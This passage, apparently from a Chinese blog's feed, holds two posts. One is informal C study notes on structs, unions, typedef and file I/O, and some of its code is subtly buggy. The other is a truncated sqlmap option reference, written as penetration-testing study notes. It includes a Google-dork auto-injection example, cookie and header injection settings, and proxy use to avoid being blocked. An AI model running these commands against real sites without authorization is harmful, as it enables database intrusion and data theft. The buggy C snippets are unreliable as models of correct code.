//取出结构体变量中每一个成员【重点】</span></span><br><span class="line"><span class="comment">1.结构体指针变量名.成员名</span></span><br><span class="line"><span class="comment">2.指针变量名-&gt;成员名    （第二种更常用）</span></span><br><span class="line"><span class="comment">struct student *p = &amp;s;  //注意是&amp;</span></span><br><span class="line"><span class="comment">p-&gt;name; //第一种方式(指针变量-&gt;成员变量名,在计算机内部会被转换为(*指针变量名).成员名)</span></span><br><span class="line"><span class="comment">(*p).name; //第二种方式，与 s.name; 等价</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">//结构体变量的运算</span></span><br><span class="line"><span class="comment">结构体变量不能相加，相减，也不能相互乘除。</span></span><br><span class="line"><span class="comment">但结构体变量可以相互赋值</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">//结构体变量和结构体变量指针作为函数参数传递的问题</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">//动态构造结构体数组</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">//链表</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> num;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">student</span>&#123;</span></span><br><span class="line"><span class="keyword">int</span> num;</span><br><span class="line"><span class="keyword">char</span> name[<span class="number">20</span>];</span><br><span class="line"><span class="keyword">char</span> gender;</span><br><span class="line"><span class="keyword">int</span> age;</span><br><span class="line"><span class="keyword">float</span> score;</span><br><span class="line"><span class="keyword">char</span> addr[<span class="number">30</span>];</span><br><span class="line">&#125; ss=&#123;1,'xx','nan',20,99.9,'hhh'&#125;;   // ss就是变量 可以直接在这里初始化</span><br><span class="line"></span><br><span class="line"><span class="comment">//赋值和初始化</span></span><br><span class="line">struct student ss2 = &#123;2,'yy','bei',20,99.9,'zzz'&#125;;</span><br><span class="line">struct student s = &#123;100,'lala','M',20,99.5, 'beij'&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 结构体数组</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">student</span> <span class="title">sArr</span>[3];</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d%s %c%d%f%s"</span>, &amp;sArr[i].num, sArr[i].name, &amp;sArr[i].gender, &amp;sArr[i].age,&amp;sArr[i].score, &amp;sArr[i].addr); <span class="comment">// %c 忽略空格</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 结构体指针</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">student</span> *<span class="title">p</span> = &amp;<span class="title">s</span>;</span>  <span class="comment">//注意是&amp;</span></span><br><span class="line"><span class="comment">//p = &amp;s;</span></span><br><span class="line"><span class="comment">// 获取成员</span></span><br><span class="line"></span><br><span class="line">p-&gt;name; <span class="comment">//第一种方式(指针变量-&gt;成员变量名,在计算机内部会被转换为(*指针变量名).成员名)</span></span><br><span class="line">(*p).name; <span class="comment">//第二种方式，与 s.name; 等价</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// p-&gt;name的含义：p所指向的那个结构体变量中的name这个成员</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">num = p-&gt;num++;   <span class="comment">// num = p-&gt;num, num=p-&gt;num+1;   //优先级</span></span><br><span class="line"><span class="comment">// 第一时间去掉++</span></span><br><span class="line">num = p++-&gt;num;    <span class="comment">// 没问题, num=p-&gt;num,  p=p+1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//浮点型默认在C语言中是double，如果要定义成float，则在后面加f或F， 但是不能准确存储</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">///////////////////////////////////////////</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Student</span>&#123;</span></span><br><span class="line"><span class="keyword">int</span> num;</span><br><span class="line"><span class="keyword">char</span> name[<span class="number">20</span>];</span><br><span class="line"><span class="keyword">int</span> age;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 通过函数完成对结构体变量的输入和输出</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">struc_func</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Student</span> <span class="title">st</span>;</span></span><br><span class="line"></span><br><span class="line">InputStudent(&amp;st);  <span class="comment">//对结构体变量输入</span></span><br><span class="line">OutputStudent(st);  <span class="comment">//对结构体变量输出</span></span><br><span class="line">OutputStudent2(&amp;st);  <span class="comment">//对结构体变量输出</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InputStudent</span><span class="params">(struct Student * pstu)</span> <span class="comment">//pstu只占4个字节</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">(*pstu).num=<span class="number">1</span>;</span><br><span class="line"><span class="built_in">strcpy</span>(pstu-&gt;name, <span class="string">"xxx"</span>);  </span><br><span class="line">pstu-&gt;age=<span class="number">18</span>;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*  这是无法改变主函数的值的</span></span><br><span class="line"><span class="comment">void InputStudent(struct Student stu)</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">stu.num=1;</span></span><br><span class="line"><span class="comment">strcpy(stu.name, "xxx");  </span></span><br><span class="line"><span class="comment">stu.age=18;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&#125;;*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">////应该发送内容还是传送地址？</span></span><br><span class="line"><span class="comment">//如果传递的是内容，内存消耗大</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">OutputStudent</span><span class="params">(struct Student stu)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d, %s %d"</span>, stu.num,stu.name, stu.age);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果传递的是地址，可能不安全，但是提高了速度，节省了内存（推荐这种方法）</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">OutputStudent2</span><span class="params">(struct Student *pstu)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d, %s %d"</span>, pstu-&gt;num,pstu-&gt;name, pstu-&gt;age);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">【指针优点大总结：】</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">快速的传递数据，较少了内存的消耗 【重点】</span></span><br><span class="line"><span class="comment">使函数返回一个以上的值  【重点】</span></span><br><span class="line"><span class="comment">能直接访问硬件</span></span><br><span class="line"><span class="comment">能方便的处理字符串</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">**/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//共用体</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test_union</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//共用体：大小等于成员中最大的那个大小（通常和结构体一起使用）</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// union 共用体name</span></span><br><span class="line"><span class="comment">// &#123;</span></span><br><span class="line"><span class="comment">//     成员表列</span></span><br><span class="line"><span class="comment">// &#125; 变量表列;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">union</span> data&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">char</span> c;</span><br><span class="line"><span class="keyword">float</span> f;</span><br><span class="line">&#125;u1;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 共用体的起始地址和每个成员的起始地址是相同的</span></span><br><span class="line"><span class="comment">// 一个时间内只能存取一个成员</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">union</span> data d; <span class="comment">// 现在最大的就是4</span></span><br><span class="line">d.i = <span class="number">4</span>;</span><br><span class="line">d.c=<span class="string">'A'</span>;</span><br><span class="line">d.f = <span class="number">99.9</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="typedef"><a href="#typedef" class="headerlink" title="typedef"></a>typedef</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1) 为基本数据类型定义新的类型名</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">double</span> REAL;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="comment">//2) 为自定义数据类型（结构体、共用体和枚举类型）定义简洁的类型名称</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tagPoint</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">double</span> x;</span><br><span class="line">    <span class="keyword">double</span> y;</span><br><span class="line">    <span class="keyword">double</span> z;</span><br><span class="line">&#125; Point;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">实际上完成了两个操作：</span></span><br><span class="line"><span class="comment">1、定义了一个新的结构类型</span></span><br><span class="line"><span class="comment">struct tagPoint</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    double x;</span></span><br><span class="line"><span class="comment">    double y;</span></span><br><span class="line"><span class="comment">    double z;</span></span><br><span class="line"><span class="comment">&#125; ;</span></span><br><span class="line"><span class="comment">2、使用 typedef 为这个新的结构起了一个别名，叫 Point</span></span><br><span class="line"><span class="comment">typedef struct tagPoint Point</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//3) 为数组定义简洁的类型名称</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">char</span>* PCHAR;</span><br><span class="line">PCHAR pa</span><br></pre></td></tr></table></figure><h4 id="NULL"><a href="#NULL" class="headerlink" title="NULL"></a>NULL</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">二进制全部为0的含义：  </span><br><span class="line">    1.数值为0</span><br><span class="line">    2.字符串结束标记符 &apos;\0&apos;</span><br><span class="line">    3.空指针NULL</span><br><span class="line">        NULL表示编号为0的地址</span><br><span class="line">        NULL表示的是零，不是数字，而是代表内存单元的编号</span><br><span class="line"></span><br><span class="line">        计算机规定了，以零为编号的存储单元的内存不可读、不可写</span><br></pre></td></tr></table></figure><h4 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//文件</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test_file</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> N 20</span></span><br><span class="line"></span><br><span class="line">FILE *fp;</span><br><span class="line">    <span class="keyword">char</span> c;</span><br><span class="line">    <span class="keyword">char</span> p;</span><br><span class="line">    <span class="keyword">char</span> ret;</span><br><span class="line">    <span class="keyword">char</span> buf[N] = &#123;<span class="number">0</span>&#125;;   <span class="comment">// 先初始化</span></span><br><span class="line">    <span class="comment">// fp = fopen("file.txt", "r");</span></span><br><span class="line">    fp = fopen(<span class="string">"D:\Desktop\1.txt"</span>, <span class="string">"r+"</span>);    <span class="comment">// argv[1] 是传递的第一个参数</span></span><br><span class="line">    <span class="keyword">if</span>(fp == <span class="literal">NULL</span>)   <span class="comment">// 判断打开是否成功， -&gt; 失败</span></span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">"fopen"</span>);   <span class="comment">// 定位函数执行错误原因（只能定位刚刚执行的）</span></span><br><span class="line">        <span class="keyword">goto</span> error;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// fgetc   读取，一次读取一个字节</span></span><br><span class="line">   <span class="keyword">while</span> ((c = fgetc(fp)) != EOF)</span><br><span class="line">   &#123;</span><br><span class="line">       <span class="built_in">printf</span>(<span class="string">"%c"</span>,c);</span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line"></span><br><span class="line">    <span class="comment">// fputs   写入，一次写入一个字节</span></span><br><span class="line">    p = <span class="string">'H'</span>;</span><br><span class="line">    ret = fputc(p, fp);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// printf(FILE *fp,const char *format, ...) 函数来写把一个字符串写入到文件中</span></span><br><span class="line"><span class="built_in">fprintf</span>(fp, <span class="string">"This is testing for fprintf...\n"</span>);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="comment">// fread:      buf没有\0</span></span><br><span class="line">    ret = fread(buf, <span class="keyword">sizeof</span>(<span class="keyword">char</span>), N, fp);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d, %s \n"</span>, ret, buf);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// fwrite:</span></span><br><span class="line">    <span class="built_in">strcpy</span>(buf, <span class="string">"word"</span>);</span><br><span class="line">    ret = fwrite(buf, <span class="keyword">sizeof</span>(<span class="keyword">char</span>), <span class="built_in">strlen</span>(buf), fp);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 清空buffer</span></span><br><span class="line">    <span class="built_in">memset</span>(buf,<span class="number">0</span>,<span class="keyword">sizeof</span>(buf));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// fseek</span></span><br><span class="line">    fseek(fp, <span class="number">0</span>, SEEK_SET);   <span class="comment">//  移动到开头。SEEK_SET,偏移量的起始点:文件开始处</span></span><br><span class="line"></span><br><span class="line">    fseek(fp, <span class="number">-12</span>, SEEK_CUR);   <span class="comment">// 往回偏移, 与磁盘上实际的字节数对应。SEEK_CUT:文件当前位置 </span></span><br><span class="line">    <span class="comment">// SEEK_END,偏移量的起始点：SEEK_END</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ftell      获取文件读写指针的当前位置</span></span><br><span class="line"><span class="keyword">long</span> last = ftell(fp);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    fclose(fp);  </span><br><span class="line"></span><br><span class="line">    error:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"error!!!"</span>);</span><br><span class="line">        <span class="comment">// fclose(fp);  // 关闭文件</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;由于好久时间不看C了，好多东西都忘了&lt;/p&gt;
&lt;p&gt;本文是跟着郝斌老师的视频做的随堂笔记，课下也没做整理，并不成系统，只是一些简单堆叠，且编码规范都没有，看看就好哈哈&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4 id=&quot;字符串&quot;&gt;&lt;a href=&quot;
      
    
    </summary>
    
      <category term="C语言" scheme="http://www.xpshuai.cn/categories/C%E8%AF%AD%E8%A8%80/"/>
    
    
      <category term="C语言" scheme="http://www.xpshuai.cn/tags/C%E8%AF%AD%E8%A8%80/"/>
    
      <category term="琐碎复习" scheme="http://www.xpshuai.cn/tags/%E7%90%90%E7%A2%8E%E5%A4%8D%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>sqlmap参数简介</title>
    <link href="http://www.xpshuai.cn/sqlmap%E5%8F%82%E6%95%B0%E7%AE%80%E4%BB%8B/"/>
    <id>http://www.xpshuai.cn/sqlmap参数简介/</id>
    <published>2020-03-22T11:57:40.000Z</published>
    <updated>2020-03-26T04:46:46.884Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/sqlmap参数简介/sqlmap.png"></p><a id="more"></a><h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><ul><li><p><a href="https://github.com/sqlmapproject/sqlmap/wiki/Usage" target="_blank" rel="noopener">官网</a></p></li><li><p>其他特性：</p><ol><li>数据库直接连接 <code>-d</code>, 不通过SQL注入，执行身份认证信息，ip，端口</li><li>与BurpSuite，Google结合使用，支持政策表但是限定测试目标</li><li>支持Basic, Digest, BTLM, CA 身份认证</li><li>db版本， 用户，权限，hash枚举和字典破解，暴力破解表列名称</li><li>文件上传下载，UDF， 启动并执行存储过程，操作系统命令执行，访问win注册表</li><li>与w3af， metasploit集成结合使用，基于数据库服务进程提权和上传执行后门</li></ol></li></ul><p><strong>升级:</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 在线更新sqlmap</span><br><span class="line">sqlmap --update</span><br><span class="line"></span><br><span class="line"># 离线升级</span><br><span class="line">git pull</span><br></pre></td></tr></table></figure></p><p><strong>其他常识：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 结果文件夹位置</span><br><span class="line">/.root/sqlmap/output</span><br><span class="line"></span><br><span class="line"># 日志</span><br><span class="line">.sqlmap</span><br><span class="line">   </span><br><span class="line"># 配置文件  </span><br><span class="line">自己找</span><br></pre></td></tr></table></figure></p><h1 id="基本参数"><a href="#基本参数" class="headerlink" title="基本参数"></a>基本参数</h1><h4 id="1-Target"><a href="#1-Target" class="headerlink" title="1. Target"></a><font color="red">1. Target</font></h4><p>   <strong>Get方法：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">-u url链接   # get链接</span><br><span class="line">-f # 检查DBMS的指纹信息</span><br><span class="line">-p user_name # 指定字段参数</span><br><span class="line">-m list.txt  # 扫描url列表文件</span><br><span class="line">-g  # google搜索,自动去google找到然后自动注入    \” 是转义引号，如下所示：</span><br><span class="line"><span class="meta">#</span><span class="bash"> 例如： sqlmap -g <span class="string">"inurl:\".php?id=1\"  </span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 结果文件夹位置</span></span><br><span class="line">/.root/sqlmap/output</span><br><span class="line"></span><br><span class="line">-- users   # 有哪些user</span><br><span class="line">--banner  # banner 信息</span><br><span class="line">--dbs   # 有哪些库</span><br><span class="line">--schema   #元数据(查的是informatin_schema信息，前提是有权限)</span><br><span class="line">-a     # 所有的</span><br><span class="line">-d  “mysql://root:@192.168.20.10:3306/dvwa”    # 让sqlmap作为客户端链接数据库（dvwa是数据库名称）</span><br></pre></td></tr></table></figure><p>   <strong>Post方法：</strong><br>就不是通过url来扫描了，而是body来进行扫描</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">-r request.txt    # 使用http请求文件进行注入（burpsuite拦截的请求数据包复制保存到文件, 存在注入的位置用*标出）</span><br><span class="line">-l  log.txt       #  使用burpsuite log文件 （使用burpsuite:option-&gt; Misc -&gt;logging -&gt; 这里选择Proxy-&gt; 这里选择requests-&gt; 选择log文件保存位置 ）</span><br><span class="line">--force-ssl       #  支持Https，即听过https来进行请求，或在url域名后+443端口也可以</span><br><span class="line">-c  sqlmap.conf   #  扫描配置文件（把扫描配置写到里面，把它引用即可）</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 查找文件</span></span><br><span class="line">dpokg -L    # 找有关..的文件包</span><br><span class="line">dpokg -L sqlmap | grep sqlmap.conf</span><br></pre></td></tr></table></figure><h4 id="2-Request"><a href="#2-Request" class="headerlink" title="2. Request "></a><font color="red">2. Request </font></h4><p>post请求  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">--data=<span class="string">"user=xx&amp;pswd=yy"</span>   <span class="comment"># 数据（对于post请求：除了保存请求头的方法，也可以这样data加参数， 也支持get方法：参数放--data后面）</span></span><br><span class="line">--param-del=<span class="string">";"</span>   <span class="comment"># 变量分隔符(若多个变量不是以&amp;分割),如：参数以分号分割   --data="name=1;id=11" --param-del=";"</span></span><br><span class="line">--cookie <span class="string">"xxxxxxxxx"</span> --level=2 <span class="comment"># 带上cookie头(level=2时才会检查cookie是否存在注入点)参数: set-cookie / --drop-set-cookie 是否丢弃上一个cookie,使用新的cookie</span></span><br><span class="line"><span class="comment">#cookie ---&gt; 登陆后才能访问的页面</span></span><br><span class="line">--user-agent=<span class="string">"xxxxxxxxxx"</span>   <span class="comment">#  指定ua头</span></span><br><span class="line">--random-agent --level=3  <span class="comment"># 随机ua头字典: /usr/share/sqlmap/txt/user-agents.txt,  win下：sqlmap/data/txt/user-agents.txt</span></span><br><span class="line"><span class="comment">#--level&gt;=3   # 才会检查user-agent头是否存在sql注入</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#app/waf/IPS/IDS过滤异常的ua头，sqlmap会报错</span></span><br><span class="line"></span><br><span class="line">--host <span class="string">"aaaaaaa"</span> --level=5  <span class="comment"># host头</span></span><br><span class="line">--level=5  <span class="comment"># 才会检查host头是否存在sql注入(一般不建议设置这么高)</span></span><br><span class="line"></span><br><span class="line">--referrer --level=3     <span class="comment"># 检查referrer</span></span><br><span class="line">--level &gt;=3   <span class="comment"># 才会检查referrer是否存在sql注入</span></span><br><span class="line"></span><br><span class="line">--headers=<span class="string">"host:www.a.com\nUser-Agent:xps"</span>   <span class="comment"># 额外的自定义的headers（\n是换行，注意大小写）</span></span><br><span class="line">--headers=<span class="string">"X-Forwarded-For:* "</span> --dbs --batch </span><br><span class="line">--method=GET/POST  <span class="comment"># 限定请求方法</span></span><br></pre></td></tr></table></figure><ul><li><strong>基于http身份认证</strong>  </li></ul><p>三种身份认证类型：</p><ul><li>Basic</li><li>Diagest</li><li>NTLM<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--auth-type Basic  --auth-cred <span class="string">"user:pass"</span>  <span class="comment"># --auth-type指定身份认证类型，后门是账号密码</span></span><br></pre></td></tr></table></figure></li></ul><p>基于客户端证书的身份认证 :<br>   <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 用的很少</span></span><br><span class="line"><span class="comment"># 下面两种参数不知道是哪个了，使用的时候自己查一下</span></span><br><span class="line">--auth-cert </span><br><span class="line">--auth-file=<span class="string">"ca.PEM"</span>    <span class="comment">#含有私钥的PEM的证书文件</span></span><br></pre></td></tr></table></figure></p><ul><li><strong>http(s)代理</strong><br>使用代理防止被封等<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">--proxy=<span class="string">"http://127.0.0.1:8888"</span>          <span class="comment"># 本地网络的话不需要代理设置</span></span><br><span class="line">--auth-cred <span class="string">"user:pass"</span>     <span class="comment"># 如果需要身份认证</span></span><br><span class="line">--ignore-proxy   <span class="comment"># 忽略系统代理设置，通常用户扫描本地网络目标（用于对本地/内容目标进行扫描的时候）</span></span><br></pre></td></tr></table></figure></li></ul><ul><li><strong>超时</strong><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">--deplay=<span class="string">"6"</span>      <span class="comment"># 每次请求之间延迟时间， 单位:s</span></span><br><span class="line">--timeout=<span class="string">"10"</span>    <span class="comment"># 请求超时时间，浮点数，默认30s</span></span><br><span class="line">--retries=<span class="string">"5"</span>      <span class="comment"># 连接超时重试次数，默认3次</span></span><br><span class="line">--randomsize=<span class="string">"id"</span>    <span class="comment"># 长度、类型与原始值保持一致的前提下，指定每次请求随机取值 的参数name（对id随机取值,但长度与原始是一致的）</span></span><br></pre></td></tr></table></figure></li></ul>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">--scope         <span class="comment"># 过滤日志(burp的request日志--&gt;option,Logging,proxy,requests)内容， 通过正则筛选扫描对象；</span></span><br><span class="line">-l burp.log  --scope=<span class="string">"&#123;www&#125;?\.target\.&#123;com|net|org&#125;"</span> --level=3</span><br><span class="line"></span><br><span class="line">--safe-url / --safe-freq     <span class="comment"># 检测和盲注阶段会产生大量失败请求，服务端可能因此销毁session。</span></span><br><span class="line"><span class="comment">#因此：每发送 --safe-freq次注入请求之后，发送一次正常的请求</span></span><br><span class="line"></span><br><span class="line">--skip-urlencode    <span class="comment"># 跳过url编码(默认GET方法会对内容进行编码，某些编码人员不遵守编码规则没编码)</span></span><br><span class="line"> </span><br><span class="line">--<span class="built_in">eval</span>=<span class="string">"import hashlib;hash=hashlib.md5(id).hexdigest()"</span>   <span class="comment"># 每次请求之前执行的py代码  / 每次请求更改或者增加新的参数值（时间依赖。其他参数依赖）后面值是依赖前面值的</span></span><br><span class="line">-u <span class="string">"id=1?hash=c4ca423dj8caf5d"</span> --<span class="built_in">eval</span> =<span class="string">"import hashlib;hash=hashlib.md5(id).hexdigest()"</span>        <span class="comment"># 比如后面参数是hash的，每次都把id编码</span></span><br></pre></td></tr></table></figure> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span 